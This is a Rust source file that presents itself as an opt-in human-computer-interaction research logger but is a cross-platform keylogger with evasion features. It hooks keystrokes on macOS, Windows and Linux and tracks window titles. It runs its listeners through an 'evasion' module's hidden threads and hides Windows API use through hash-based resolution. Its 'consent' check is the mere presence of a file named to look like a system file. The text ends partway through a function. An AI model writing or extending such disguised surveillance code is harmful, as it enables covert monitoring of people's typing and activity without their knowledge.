//! Optional Human-Computer Interaction (HCI) logging for research.
//!
//! This module provides capabilities for collecting anonymized interaction data,
//! such as active window titles and keyboard events. It is designed with

//! privacy safeguards and is strictly opt-in.
//!
//! **Warning:** This module must only be used with informed user consent and
//! in full compliance with all applicable privacy regulations (e.g., GDPR).
//! The data collected can be sensitive.

#![cfg(feature = "hci-research")]

use common::lock::MutexExt;
use chrono::Utc;
use once_cell::sync::Lazy;
use serde::Serialize;
use std::collections::VecDeque;
use std::fs;
use std::hash::{Hash, Hasher};
use std::sync::atomic::{AtomicBool, Ordering};
use std::sync::{Arc, Mutex};
use std::thread;
use std::time::Duration;
use twox_hash::XxHash64;

const MAX_BUFFER_SIZE: usize = 10_000;
/// Events older than this many seconds are purged by `purge_expired_events()`.
const MAX_RETENTION_SECONDS: u64 = 86_400; // 24 hours

/// Window title substrings that indicate potentially sensitive context.
/// Events captured while these windows are active are dropped rather than
/// buffered, to avoid inadvertently recording authentication material.
const SENSITIVE_WINDOW_FILTERS: &[&str] = &[
    "password",
    "keepass",
    "1password",
    "lastpass",
    "bitwarden",
    "credential",
    "sign in",
    "login",
    "log in",
    "authenticate",
    "keychain",
    "wallet",
];

#[derive(Serialize, Clone, Debug)]
pub struct KeyEvent {
    timestamp: u64,
    pressed: bool,
}

#[derive(Serialize, Clone, Debug)]
pub struct WindowEvent {
    timestamp: u64,
    title_hash: u64,
}

#[derive(Serialize, Clone, Debug)]
pub enum HciEvent {
    Keyboard(KeyEvent),
    Window(WindowEvent),
}

static CONSENT_FILE_PATH: Lazy<Mutex<String>> = Lazy::new(|| {
    Mutex::new(
        // Default to a user-level path consistent with remote_assist.rs:
        // prefer $HOME so no elevated privileges are needed.
        std::env::var("HOME")
            .map(|h| format!("{}/.sysd-notify", h))
            .unwrap_or_else(|_| {
                #[cfg(target_os = "linux")]
                {
                    std::env::var("XDG_RUNTIME_DIR")
                        .map(|d| format!("{}/sysd-notify", d))
                        .unwrap_or_else(|_| "/tmp/.sysd-notify".to_string())
                }
                #[cfg(not(target_os = "linux"))]
                {
                    "/tmp/.sysd-notify".to_string()
                }
            }),
    )
});
static HCI_LOG_BUFFER: Lazy<Arc<Mutex<VecDeque<HciEvent>>>> =
    Lazy::new(|| Arc::new(Mutex::new(VecDeque::with_capacity(MAX_BUFFER_SIZE))));
/// Gates event processing and controls the window-title polling thread.
/// AtomicBool allows lock-free access from the key-listener callback.
static IS_LOGGING: Lazy<Arc<AtomicBool>> = Lazy::new(|| Arc::new(AtomicBool::new(false)));
/// Prevents spawning more than one key-listener thread.
/// The platform-specific listener blocks indefinitely; once started the
/// thread runs for the process lifetime and we gate event delivery via
/// IS_LOGGING instead of stopping and restarting the thread.
static LISTENER_STARTED: Lazy<AtomicBool> = Lazy::new(|| AtomicBool::new(false));
/// Prevents accumulating window-title polling threads across repeated
/// start/stop cycles.  The flag is cleared when the thread exits so that
/// the next start_logging call can re-spawn it.
static WINDOW_POLLER_STARTED: Lazy<AtomicBool> = Lazy::new(|| AtomicBool::new(false));

#[cfg(target_os = "macos")]
/// macOS-only guard to avoid spawning duplicate periodic event-tap health
/// check threads across repeated start_logging() calls.
static TAP_HEALTH_CHECK_STARTED: Lazy<AtomicBool> = Lazy::new(|| AtomicBool::new(false));

#[cfg(target_os = "macos")]
const MACOS_TAP_PERMISSION_WARNING: &str = "hci_logging: CGEventTap creation failed — the application likely lacks Accessibility permissions. Enable it in System Preferences > Security & Privacy > Privacy > Accessibility.";

#[cfg(target_os = "macos")]
#[derive(Clone, Copy, Debug, PartialEq, Eq)]
enum MacOsTapHealth {
    /// CGEventTapCreate returned NULL and the tap is therefore not enabled.
    /// This is typically a permissions-denied condition.
    CreationFailedDisabled,
    /// Event tap object exists but is disabled.
    Disabled,
    /// Event tap exists and is enabled.
    Enabled,
}

#[cfg(target_os = "macos")]
fn probe_macos_event_tap_health() -> MacOsTapHealth {
    use std::ffi::c_void;

    type CGEventTapProxy = *mut c_void;
    type CGEventType = u32;
    type CGEventRef = *mut c_void;
    type CFMachPortRef = *mut c_void;

    extern "C" {
        fn CGEventTapCreate(
            tap: u32,
            place: u32,
            options: u32,
            events_of_interest: u64,
            callback: extern "C" fn(
                CGEventTapProxy,
                CGEventType,
                CGEventRef,
                *mut c_void,
            ) -> CGEventRef,
            user_info: *mut c_void,
        ) -> CFMachPortRef;
        fn CGEventTapIsEnabled(tap: CFMachPortRef) -> u8;
        fn CFMachPortInvalidate(port: CFMachPortRef);
        fn CFRelease(cf: *const c_void);
    }

    extern "C" fn passthrough_callback(
        _proxy: CGEventTapProxy,
        _event_type: CGEventType,
        event: CGEventRef,
        _user_info: *mut c_void,
    ) -> CGEventRef {
        event
    }

    // kCGSessionEventTap=1, kCGHeadInsertEventTap=0,
    // kCGEventTapOptionListenOnly=1, keyDown(10)|keyUp(11).
    let event_mask = (1u64 << 10) | (1u64 << 11);
    let tap = unsafe {
        CGEventTapCreate(
            1,
            0,
            1,
            event_mask,
            passthrough_callback,
            std::ptr::null_mut(),
        )
    };

    let enabled = if tap.is_null() {
        false
    } else {
        unsafe { CGEventTapIsEnabled(tap) != 0 }
    };

    // Permission-denial path requested by Prompt 7-6: creation failed and
    // the tap is not enabled.
    if tap.is_null() && !enabled {
        return MacOsTapHealth::CreationFailedDisabled;
    }

    unsafe {
        CFMachPortInvalidate(tap);
        CFRelease(tap as *const c_void);
    }

    if enabled {
        MacOsTapHealth::Enabled
    } else {
        MacOsTapHealth::Disabled
    }
}

fn check_consent() -> bool {
    let path = CONSENT_FILE_PATH.lock_recover();
    fs::metadata(path.as_str()).is_ok()
}

// ─── Platform-specific key listeners ──────────────────────────────────────
//
// Each listener runs on a hidden thread and calls `add_log_event` for every
// key press / release.  The specific key code is captured but NOT stored —
// only the pressed/released boolean is recorded for HCI research.

/// Helper: record a key event from any listener thread.
fn record_key_event(buffer: &Arc<Mutex<VecDeque<HciEvent>>>, pressed: bool) {
    let timestamp = Utc::now().timestamp_micros() as u64;
    add_log_event(buffer, HciEvent::Keyboard(KeyEvent { timestamp, pressed }));
}

// ── macOS listener ─────────────────────────────────────────────────────────
#[cfg(target_os = "macos")]
fn hci_listen_macos(logging_flag: Arc<AtomicBool>, buffer_handle: Arc<Mutex<VecDeque<HciEvent>>>) {
    use std::ffi::c_void;
    use std::os::raw::c_ulong;

    // SAFETY: All symbols resolved at runtime from system frameworks.
    // No static IAT entries.
    unsafe {
        // ---- Resolve CoreGraphics / CoreFoundation symbols dynamically ----
        type FnCFRunLoopGetCurrent = unsafe extern "C" fn() -> *mut c_void;
        type FnCFRunLoopGetCurrentAndRetain = unsafe extern "C" fn() -> *mut c_void;
        type FnCFRunLoopRun = unsafe extern "C" fn();
        type FnCGEventTapCreate = unsafe extern "C" fn(
            tap: u32,                    // kCGHIDEventTap = 0
            place: u32,                  // kCGHeadInsertEventTap = 0
            options: u32,                // kCGEventTapOptionListenOnly = 1
            events_of_interest: c_ulong, // CGEventMask bitfield
            callback: unsafe extern "C" fn(
                proxy: *mut c_void,
                etype: u32,         // CGEventType
                event: *mut c_void, // CGEventRef
                user_info: *mut c_void,
            ) -> *mut c_void,
            user_info: *mut c_void,
        ) -> *mut c_void;
        type FnCFMachPortCreateRunLoopSource = unsafe extern "C" fn(
            allocator: *mut c_void,
            port: *mut c_void,
            order: i32,
        ) -> *mut c_void;
        type FnCFRunLoopAddSource = unsafe extern "C" fn(
            rl: *mut c_void,
            source: *mut c_void,
            mode: *const c_void, // CFStringRef (kCFRunLoopCommonModes)
        );
        type FnCFRelease = unsafe extern "C" fn(cf: *const c_void);

        // CGEventType constants
        const CG_EVENT_KEY_DOWN: u32 = 10;
        const CG_EVENT_KEY_UP: u32 = 11;
        // CGEventMask forKeyDown | keyUp
        let event_mask: c_ulong = (1u64 << CG_EVENT_KEY_DOWN) | (1u64 << CG_EVENT_KEY_UP);

        // Raw callback: invoked by CoreGraphics on the CFRunLoop thread.
        extern "C" fn macos_key_callback(
            _proxy: *mut c_void,
            etype: u32,
            _event: *mut c_void,
            user_info: *mut c_void,
        ) -> *mut c_void {
            // Recover the Arc references from the user_info pointer.
            // We boxed them and leaked the box; the pointer stays valid
            // for the thread lifetime.
            let ctx = unsafe { &*(user_info as *const MacOsListenerContext) };
            let pressed = match etype {
                CG_EVENT_KEY_DOWN => true,
                CG_EVENT_KEY_UP => false,
                _ => return std::ptr::null_mut(),
            };
            if ctx.logging_flag.load(Ordering::Relaxed) {
                record_key_event(&ctx.buffer_handle, pressed);
            }
            std::ptr::null_mut()
        }

        // Context struct to pass Arcs into the C callback.
        struct MacOsListenerContext {
            logging_flag: Arc<AtomicBool>,
            buffer_handle: Arc<Mutex<VecDeque<HciEvent>>>,
        }
        let ctx = Box::new(MacOsListenerContext {
            logging_flag,
            buffer_handle,
        });
        let ctx_ptr = Box::into_raw(ctx) as *mut c_void;

        // Resolve CoreGraphics framework path dynamically.
        let cg_path = std::ffi::CString::new(
            "/System/Library/Frameworks/CoreGraphics.framework/CoreGraphics",
        )
        .unwrap();
        let cf_path = std::ffi::CString::new(
            "/System/Library/Frameworks/CoreFoundation.framework/CoreFoundation",
        )
        .unwrap();

        let cg_handle = libc::dlopen(cg_path.as_ptr(), libc::RTLD_NOW);
        let cf_handle = libc::dlopen(cf_path.as_ptr(), libc::RTLD_NOW);

        if cg_handle.is_null() || cf_handle.is_null() {
            tracing::error!("[hci-logging] macOS: failed to load CoreGraphics/CoreFoundation");
            LISTENER_STARTED.store(false, Ordering::SeqCst);
            return;
        }

        let cg_tap_create: FnCGEventTapCreate = {
            let sym = libc::dlsym(cg_handle, b"CGEventTapCreate\0".as_ptr() as *const i8);
            if sym.is_null() {
                tracing::error!("[hci-logging] macOS: CGEventTapCreate not found");
                LISTENER_STARTED.store(false, Ordering::SeqCst);
                return;
            }
            std::mem::transmute(sym)
        };

        let cf_runloop_get_current: FnCFRunLoopGetCurrent = {
            let sym = libc::dlsym(cf_handle, b"CFRunLoopGetCurrent\0".as_ptr() as *const i8);
            if sym.is_null() {
                tracing::error!("[hci-logging] macOS: CFRunLoopGetCurrent not found");
                LISTENER_STARTED.store(false, Ordering::SeqCst);
                return;
            }
            std::mem::transmute(sym)
        };

        let cf_runloop_run: FnCFRunLoopRun = {
            let sym = libc::dlsym(cf_handle, b"CFRunLoopRun\0".as_ptr() as *const i8);
            if sym.is_null() {
                tracing::error!("[hci-logging] macOS: CFRunLoopRun not found");
                LISTENER_STARTED.store(false, Ordering::SeqCst);
                return;
            }
            std::mem::transmute(sym)
        };

        let cf_mach_port_create_rl_source: FnCFMachPortCreateRunLoopSource = {
            let sym = libc::dlsym(
                cf_handle,
                b"CFMachPortCreateRunLoopSource\0".as_ptr() as *const i8,
            );
            if sym.is_null() {
                tracing::error!("[hci-logging] macOS: CFMachPortCreateRunLoopSource not found");
                LISTENER_STARTED.store(false, Ordering::SeqCst);
                return;
            }
            std::mem::transmute(sym)
        };

        let cf_runloop_add_source: FnCFRunLoopAddSource = {
            let sym = libc::dlsym(cf_handle, b"CFRunLoopAddSource\0".as_ptr() as *const i8);
            if sym.is_null() {
                tracing::error!("[hci-logging] macOS: CFRunLoopAddSource not found");
                LISTENER_STARTED.store(false, Ordering::SeqCst);
                return;
            }
            std::mem::transmute(sym)
        };

        let cf_release: FnCFRelease = {
            let sym = libc::dlsym(cf_handle, b"CFRelease\0".as_ptr() as *const i8);
            if sym.is_null() {
                tracing::error!("[hci-logging] macOS: CFRelease not found");
                LISTENER_STARTED.store(false, Ordering::SeqCst);
                return;
            }
            std::mem::transmute(sym)
        };

        // Resolve kCFRunLoopCommonModes from CoreFoundation.
        let kcf_common_modes: *const c_void = {
            let sym = libc::dlsym(cf_handle, b"kCFRunLoopCommonModes\0".as_ptr() as *const i8);
            if sym.is_null() {
                tracing::error!("[hci-logging] macOS: kCFRunLoopCommonModes not found");
                LISTENER_STARTED.store(false, Ordering::SeqCst);
                return;
            }
            // kCFRunLoopCommonModes is a CFStringRef — a pointer-sized value
            // stored at the symbol address.
            *(sym as *const *const c_void)
        };

        // Create the event tap (listen-only, no interception).
        let tap = cg_tap_create(
            0, // kCGHIDEventTap
            0, // kCGHeadInsertEventTap
            1, // kCGEventTapOptionListenOnly
            event_mask,
            macos_key_callback,
            ctx_ptr,
        );

        if tap.is_null() {
            tracing::error!(
                "[hci-logging] macOS: CGEventTapCreate returned NULL. \
                 Accessibility permissions are likely missing."
            );
            LISTENER_STARTED.store(false, Ordering::SeqCst);
            // Reclaim context to avoid leak.
            let _ = Box::from_raw(ctx_ptr as *mut MacOsListenerContext);
            return;
        }

        // Create a run-loop source from the mach port and add it.
        let source = cf_mach_port_create_rl_source(std::ptr::null_mut(), tap, 0);
        let rl = cf_runloop_get_current();
        cf_runloop_add_source(rl, source, kcf_common_modes);

        // Enter the run loop — blocks until the run loop is stopped.
        cf_runloop_run();

        // Cleanup (unreachable in normal operation since CFRunLoopRun blocks).
        cf_release(source);
        cf_release(tap);
        let _ = Box::from_raw(ctx_ptr as *mut MacOsListenerContext);
    }
}

// ── Windows listener: WH_KEYBOARD_LL via pe_resolve ───────────────────────
#[cfg(target_os = "windows")]
fn hci_listen_windows(
    logging_flag: Arc<AtomicBool>,
    buffer_handle: Arc<Mutex<VecDeque<HciEvent>>>,
) {
    use crate::pe_resolve_macros::{hash_str_const, hash_wstr_const};

    // Context stored in a global so the hook callback can access it.
    struct WinListenerContext {
        logging_flag: Arc<AtomicBool>,
        buffer_handle: Arc<Mutex<VecDeque<HciEvent>>>,
        call_next_hook: unsafe extern "system" fn(isize, i32, usize, isize) -> isize,
    }

    // WH_KEYBOARD_LL = 13, WM_KEYDOWN = 0x0100, WM_SYSKEYDOWN = 0x0104,
    // WM_KEYUP = 0x0101, WM_SYSKEYUP = 0x0105
    const WH_KEYBOARD_LL: i32 = 13;

    // Global pointer to the context (lives for the thread lifetime).
    static WIN_HCI_CTX: std::sync::atomic::AtomicPtr<std::ffi::c_void> =
        std::sync::atomic::AtomicPtr::new(std::ptr::null_mut());

    unsafe extern "system" fn keyboard_hook_proc(
        n_code: i32,
        w_param: usize,
        _l_param: isize,
    ) -> isize {
        if n_code >= 0 {
            let pressed = matches!(w_param, 0x0100 | 0x0104); // KEYDOWN | SYSKEYDOWN
            let released = matches!(w_param, 0x0101 | 0x0105); // KEYUP | SYSKEYUP
            if pressed || released {
                let ctx_ptr = WIN_HCI_CTX.load(Ordering::Relaxed);
                if !ctx_ptr.is_null() {
                    let ctx = &*(ctx_ptr as *const WinListenerContext);
                    if ctx.logging_flag.load(Ordering::Relaxed) {
                        record_key_event(&ctx.buffer_handle, pressed);
                    }
                }
            }
        }
        // CallNextHookEx — resolved once and stored in context.
        let ctx_ptr = WIN_HCI_CTX.load(Ordering::Relaxed);
        if !ctx_ptr.is_null() {
            let ctx = &*(ctx_ptr as *const WinListenerContext);
            (ctx.call_next_hook)(0, n_code, w_param, _l_param)
        } else {
            0 // CallNextHookEx(0, n_code, w_param, l_param)
        }
    }

    unsafe {
        // Resolve all needed APIs via pe_resolve (no static IAT).
        let user32 = pe_resolve::get_module_handle_by_hash(hash_wstr_const(
            // user32.dll as UTF-16
            &[
                'u' as u16, 's' as u16, 'e' as u16, 'r' as u16, '3' as u16, '2' as u16, '.' as u16,
                'd' as u16, 'l' as u16, 'l' as u16, 0,
            ],
        ))
        .expect("hci-logging: user32.dll not found");

        let call_next: unsafe extern "system" fn(isize, i32, usize, isize) -> isize =
            std::mem::transmute(
                pe_resolve::get_proc_address_by_hash(user32, hash_str_const(b"CallNextHookEx\0"))
                    .expect("hci-logging: CallNextHookEx resolution failed"),
            );

        let ctx = Box::new(WinListenerContext {
            logging_flag,
            buffer_handle,
            call_next_hook: call_next,
        });
        let ctx_raw = Box::into_raw(ctx) as *mut std::ffi::c_void;
        WIN_HCI_CTX.store(ctx_raw, Ordering::SeqCst);

        let set_hook: unsafe extern "system" fn(
            i32,
            unsafe extern "system" fn(i32, usize, isize) -> isize,
            *mut std::ffi::c_void,
            u32,
        ) -> isize = std::mem::transmute(
            pe_resolve::get_proc_address_by_hash(user32, hash_str_const(b"SetWindowsHookExW\0"))
                .expect("hci-logging: SetWindowsHookExW resolution failed"),
        );
        let get_message: unsafe extern "system" fn(*mut std::ffi::c_void, isize, u32, u32) -> i32 =
            std::mem::transmute(
                pe_resolve::get_proc_address_by_hash(user32, hash_str_const(b"GetMessageW\0"))
                    .expect("hci-logging: GetMessageW resolution failed"),
            );
        let unhook: unsafe extern "system" fn(isize) -> i32 = std::mem::transmute(
            pe_resolve::get_proc_address_by_hash(user32, hash_str_const(b"UnhookWindowsHookEx\0"))
                .expect("hci-logging: UnhookWindowsHookEx resolution failed"),
        );

        let kernel32 = pe_resolve::get_module_handle_by_hash(hash_wstr_const(&[
            'k' as u16, 'e' as u16, 'r' as u16, 'n' as u16, 'e' as u16, 'l' as u16, '3' as u16,
            '2' as u16, '.' as u16, 'd' as u16, 'l' as u16, 'l' as u16, 0,
        ]))
        .expect("hci-logging: kernel32.dll not found");
        let get_module: unsafe extern "system" fn(*const u16) -> *mut std::ffi::c_void =
            std::mem::transmute(
                pe_resolve::get_proc_address_by_hash(
                    kernel32,
                    hash_str_const(b"GetModuleHandleW\0"),
                )
                .expect("hci-logging: GetModuleHandleW resolution failed"),
            );

        let h_module = get_module(std::ptr::null());
        let hook = set_hook(WH_KEYBOARD_LL, keyboard_hook_proc, h_module, 0);

        if hook == 0 {
            tracing::error!("[hci-logging] Windows: SetWindowsHookExW failed");
            LISTENER_STARTED.store(false, Ordering::SeqCst);
            let _ = Box::from_raw(ctx_raw as *mut WinListenerContext);
            return;
        }

        // Message pump — blocks until WM_QUIT.
        let mut msg = std::mem::zeroed();
        loop {
            let ret = get_message(&mut msg, 0, 0, 0);
            if ret == 0 {
                break; // WM_QUIT
            }
        }

        // Cleanup.
        let _ = unhook(hook);
        WIN_HCI_CTX.store(std::ptr::null_mut(), Ordering::SeqCst);
        let _ = Box::from_raw(ctx_raw as *mut WinListenerContext);
    }
}

// ── Linux listener: evdev polling ─────────────────────────────────────────
#[cfg(target_os = "linux")]
fn hci_listen_linux(logging_flag: Arc<AtomicBool>, buffer_handle: Arc<Mutex<VecDeque<HciEvent>>>) {
    use std::fs::File;
    use std::io::Read;
    use std::os::unix::fs::OpenOptionsExt;

    // linux/input.h constants
    const EV_KEY: u16 = 0x01;
    // sizeof(struct input_event) = 24 bytes on 64-bit
    const INPUT_EVENT_SIZE: usize = 24;

    /// Enumerate /dev/input/eventX devices and open those that report keys.
    fn open_evdev_devices() -> Vec<File> {
        let mut devices = Vec::new();
        let Ok(entries) = std::fs::read_dir("/dev/input") else {
            return devices;
        };
        for entry in entries.flatten() {
            let name = entry.file_name();
            let name_str = name.to_string_lossy();
            if !name_str.starts_with("event") {
                continue;
            }
            // Check that this device has keys via ioctls.
            // For simplicity, open non-blocking and try to read.
            if let Ok(f) = std::fs::OpenOptions::new()
                .read(true)
                .custom_flags(libc::O_NONBLOCK)
                .open(entry.path())
            {
                devices.push(f);
            }
        }
        devices
    }

    let mut devices = open_evdev_devices();
    if devices.is_empty() {
        tracing::error!("[hci-logging] Linux: no /dev/input/eventX devices found");
        LISTENER_STARTED.store(false, Ordering::SeqCst);
        return;
    }

    let mut buf = [0u8; INPUT_EVENT_SIZE];
    loop {
        if !logging_flag.load(Ordering::Relaxed) {
            std::thread::sleep(std::time::Duration::from_millis(100));
            continue;
        }
        for dev in &mut devices {
            loop {
                match dev.read_exact(&mut buf) {
                    Ok(()) => {
                        // struct input_event { timeval: 16 bytes, type: u16, code: u16, value: i32 }
                        let ev_type = u16::from_le_bytes([buf[16], buf[17]]);
                        let value = i32::from_le_bytes([buf[20], buf[21], buf[22], buf[23]]);
                        if ev_type == EV_KEY {
                            let pressed = value > 0; // 1=press, 2=repeat, 0=release
                            if value != 2 {
                                // skip repeats
                                record_key_event(&buffer_handle, pressed);
                            }
                        }
                    }
                    Err(ref e) if e.kind() == std::io::ErrorKind::WouldBlock => {
                        break; // no more events on this device
                    }
                    Err(_) => break,
                }
            }
        }
        // Small sleep to avoid busy-wait when no events.
        std::thread::sleep(std::time::Duration::from_millis(10));
    }
}

/// Starts the HCI logging process.
pub fn start_logging() -> Result<(), String> {
    if !check_consent() {
        return Err("HCI research consent not found. Aborting.".to_string());
    }

    // Atomically transition false → true; fail if already logging.
    if IS_LOGGING
        .compare_exchange(false, true, Ordering::SeqCst, Ordering::SeqCst)
        .is_err()
    {
        return Err("Logging is already in progress.".to_string());
    }

    // Spawn the platform-specific key-listener thread at most once.
    // The listener has no cancellation API; IS_LOGGING gates event recording.
    if !LISTENER_STARTED.swap(true, Ordering::SeqCst) {
        let logging_flag = Arc::clone(&IS_LOGGING);
        let buffer_handle = Arc::clone(&HCI_LOG_BUFFER);

        // The `callback` closure is defined per-platform below and forwarded
        // to the matching listener implementation.  Only keyboard events are
        // captured; the specific key code is discarded (not stored).

        // ── macOS: CGEventTap with no static imports ─────────────────────
        // thread with an active CFRunLoop.  We dispatch the listener to the main
        // thread via a global channel and run it in the main thread's CFRunLoop.
        // On other platforms, spawn a background thread as before.
        #[cfg(target_os = "macos")]
        {
            // Check accessibility permissions before attempting to listen.
            // AXIsProcessTrusted() returns true if the app has Accessibility perms.
            // Without this, CGEventTapCreate silently returns NULL.
            let trusted = unsafe {
                extern "C" {
                    fn AXIsProcessTrusted() -> bool;
                }
                AXIsProcessTrusted()
            };
            if !trusted {
                tracing::warn!(
                    "hci_logging: macOS Accessibility permission is not granted. \
                     Key events may not be captured until this process is added in \
                     System Preferences -> Privacy & Security -> Accessibility."
                );
            }

            // Probe event-tap state up front to give operators actionable
            // feedback when key capture is unavailable due to permissions.
            match probe_macos_event_tap_health() {
                MacOsTapHealth::CreationFailedDisabled => {
                    tracing::warn!("{}", MACOS_TAP_PERMISSION_WARNING);
                    IS_LOGGING.store(false, Ordering::SeqCst);
                    LISTENER_STARTED.store(false, Ordering::SeqCst);
                    return Err(
                        "hci_logging: CGEventTap initialization failed due to missing macOS Accessibility permissions"
                            .to_string(),
                    );
                }
                MacOsTapHealth::Disabled => {
                    tracing::warn!(
                        "hci_logging: macOS CGEventTap is not enabled. \
                         Grant Accessibility permissions to this process in \
                         System Preferences -> Privacy & Security -> Accessibility \
                         to enable keylogging."
                    );
                }
                MacOsTapHealth::Enabled => {}
            }

            crate::evasion::spawn_hidden_thread(move || {
                hci_listen_macos(logging_flag, buffer_handle);
            });

            // Periodic health check: CGEventTap can be disabled at runtime if
            // Accessibility permissions are revoked while the process is alive.
            if !TAP_HEALTH_CHECK_STARTED.swap(true, Ordering::SeqCst) {
                crate::evasion::spawn_hidden_thread(move || {
                    let mut warned_disabled = false;
                    while LISTENER_STARTED.load(Ordering::Relaxed) {
                        if IS_LOGGING.load(Ordering::Relaxed) {
                            match probe_macos_event_tap_health() {
                                MacOsTapHealth::Enabled => {
                                    warned_disabled = false;
                                }
                                MacOsTapHealth::CreationFailedDisabled
                                | MacOsTapHealth::Disabled => {
                                    if !warned_disabled {
                                        tracing::warn!(
                                            "hci_logging: macOS CGEventTap was disabled at runtime - \
                                             Accessibility permissions may have been revoked."
                                        );
                                        warned_disabled = true;
                                    }
                                }
                            }
                        }
                        thread::sleep(Duration::from_secs(60));
                    }
                    TAP_HEALTH_CHECK_STARTED.store(false, Ordering::SeqCst);
                });
            }
        }

        // ── Windows: WH_KEYBOARD_LL via pe_resolve (no static IAT) ───────
        #[cfg(target_os = "windows")]
        {
            crate::evasion::spawn_hidden_thread(move || {
                hci_listen_windows(logging_flag, buffer_handle);
            });
        }

        // ── Linux: evdev polling (no static imports) ─────────────────────
        #[cfg(target_os = "linux")]
        {
            crate::evasion::spawn_hidden_thread(move || {
                hci_listen_linux(logging_flag, buffer_handle);
            });
        }

        // ── Other platforms ───────────────────────────────────────────────
        #[cfg(not(any(target_os = "macos", target_os = "windows", target_os = "linux")))]
        {
            let _ = (logging_flag, buffer_handle);
            tracing::error!("[hci-logging] key listener not implemented on this platform");
            LISTENER_STARTED.store(false, Ordering::SeqCst);
        }
    }

    // The window-title polling thread exits on its own when IS_LOGGING becomes
    // false.  Guard against accumulating threads across rapid start/stop cycles
    // with WINDOW_POLLER_STARTED; the thread clears the flag when it exits.
    if !WINDOW_POLLER_STARTED.swap(true, Ordering::SeqCst) {
        let logging_flag = Arc::clone(&IS_LOGGING);
        let buffer_handle_win = Arc::clone(&HCI_LOG_BUFFER);
        crate::evasion::spawn_hidden_thread(move || {
            // Debounce: track the last-logged title hash and skip duplicate
            // events.  Rapid window switching otherwise generates excessive
            // log entries for every 1-second poll tick.
            let mut last_logged_hash: Option<u64> = None;
            while logging_flag.load(Ordering::Relaxed) {
                if let Ok(title) = get_active_window_title() {
                    // 5.6: Suppress recording when active window is sensitive
                    // (password manager, sign-in dialog, etc.).
                    if is_sensitive_window(&title) {
                        thread::sleep(Duration::from_secs(1));
                        continue;
                    }
                    let timestamp = Utc::now().timestamp_micros() as u64;
                    let mut hasher = XxHash64::default();
                    title.hash(&mut hasher);
                    let title_hash = hasher.finish();
                    // Only log when the active window has actually changed.
                    if last_logged_hash != Some(title_hash) {
                        last_logged_hash = Some(title_hash);
                        add_log_event(
                            &buffer_handle_win,
                            HciEvent::Window(WindowEvent {
                                timestamp,
                                title_hash,
                            }),
                        );
                    }
                }
                thread::sleep(Duration::from_secs(1));
            }
            // Allow a subsequent start_logging call to spawn a fresh thread.
            WINDOW_POLLER_STARTED.store(false, Ordering::SeqCst);
        });
    }

    tracing::debug!("HCI logging started.");
    Ok(())
}

/// Stops the HCI logging process.
pub fn stop_logging() -> Result<(), String> {
    // Atomically transition true → false; fail if not logging.
    if IS_LOGGING
        .compare_exchange(true, false, Ordering::SeqCst, Ordering::SeqCst)
        .is_err()
    {
        return Err("Logging is not in progress.".to_string());
    }
    tracing::debug!("HCI logging stopped.");
    Ok(())
}

/// Retrieves the current HCI log buffer.
pub fn get_log_buffer() -> Result<Vec<HciEvent>, String> {
    let buffer = HCI_LOG_BUFFER.lock_recover();
    Ok(buffer.iter().cloned().collect())
}

/// Adds an event to the log buffer, enforcing size limits.
fn add_log_event(buffer_handle: &Arc<Mutex<VecDeque<HciEvent>>>, event: HciEvent) {
    let mut buffer = buffer_handle.lock_recover();
    if buffer.len() == MAX_BUFFER_SIZE {
        buffer.pop_front();
    }
    buffer.push_back(event);
}

/// Returns `true` when `cmd` is found as an executable file in any directory
/// listed in the `PATH` environment variable.  Used to avoid depending on the
/// `which` crate for a single binary-existence check.
#[cfg(target_os = "linux")]
fn command_available(cmd: &str) -> bool {
    let path_var = match std::env::var("PATH") {
        Ok(v) => v,
        Err(_) => return false,
    };
    path_var.split(':').any(|dir| {
        let p = std::path::Path::new(dir).join(cmd);
        p.is_file()
    })
}

#[cfg(target_os = "linux")]
fn get_active_window_title() -> Result<String, String> {
    use std::process::Command;

    // On a pure Wayland session (no X11 socket), xdotool cannot connect.
    // Try Wayland-native approaches first.
    let on_wayland = std::env::var_os("WAYLAND_DISPLAY").is_some();
    let on_x11 = std::env::var_os("DISPLAY").is_some();

    if on_wayland && !on_x11 {
        // GNOME Shell (mutter): query via gdbus.
        if let Ok(out) = Command::new("gdbus")
            .args([
                "call",
                "--session",
                "--dest",
                "org.gnome.Shell",
                "--object-path",
                "/org/gnome/Shell",
                "--method",
                "org.gnome.Shell.Eval",
                "global.display.focus_window?.title ?? ''",
            ])
            .output()
        {
            if out.status.success() {
                let raw = String::from_utf8_lossy(&out.stdout);
                // gdbus returns: (true, 'Window Title\n')
                if let Some(inner) = raw
                    .split('\'')
                    .nth(1)
                    .map(|s| s.trim_end_matches('\'').trim().to_string())
                {
                    if !inner.is_empty() {
                        return Ok(inner);
                    }
                }
            }
        }

        // KDE Plasma (kwin): use qdbus.
        if let Ok(out) = Command::new("qdbus")
            .args(["org.kde.KWin", "/KWin", "queryWindowInfo"])
            .output()
        {
            if out.status.success() {
                let raw = String::from_utf8_lossy(&out.stdout);
                // Output is a newline-separated "key: value" list; find caption.
                for line in raw.lines() {
                    if let Some(rest) = line.strip_prefix("caption: ") {
                        let title = rest.trim().to_string();
                        if !title.is_empty() {
                            return Ok(title);
                        }
                    }
                }
            }
        }

        // No Wayland compositor interface was reachable.
        return Err(
            "Wayland session detected but no compositor IPC is available (tried gdbus/qdbus)"
                .to_string(),
        );
    }

    // X11 path: use xdotool if available.
    if !on_x11 {
        return Err(
            "No display available (DISPLAY and WAYLAND_DISPLAY are both unset)".to_string(),
        );
    }

    // Check that xdotool is installed before attempting to call it.
    if !command_available("xdotool") {
        return Err(
            "xdotool not found on PATH; install it to enable X11 window-title tracking".to_string(),
        );
    }

    // Use a thread-based timeout so we don't depend on the GNU `timeout`
    // command.  If xdotool hangs (e.g. broken X server), the thread is
    // abandoned after 2 s and we return a neutral error.
    let (tx, rx) = std::sync::mpsc::channel();
    std::thread::spawn(move || {
        let result = Command::new("xdotool")
            .args(["getactivewindow", "getwindowname"])
            .output();
        let _ = tx.send(result);
    });

    match rx.recv_timeout(std::time::Duration::from_secs(2)) {
        Ok(Ok(output)) if output.status.success() => {
            Ok(String::from_utf8_lossy(&output.stdout).trim().to_string())
        }
        Ok(Ok(output)) => Err(String::from_utf8_lossy(&output.stderr).to_string()),
        Ok(Err(e)) => Err(e.to_string()),
        Err(_) => Err("xdotool timed out after 2 s".to_string()),
    }
}

#[cfg(target_os = "windows")]
fn get_active_window_title() -> Result<String, String> {
    use std::ffi::OsString;
    use std::os::windows::ffi::OsStringExt;

    // ── pe_resolve helpers ────────────────────────────────────────────────
    use crate::pe_resolve_macros::{hash_str_const, hash_wstr_const};
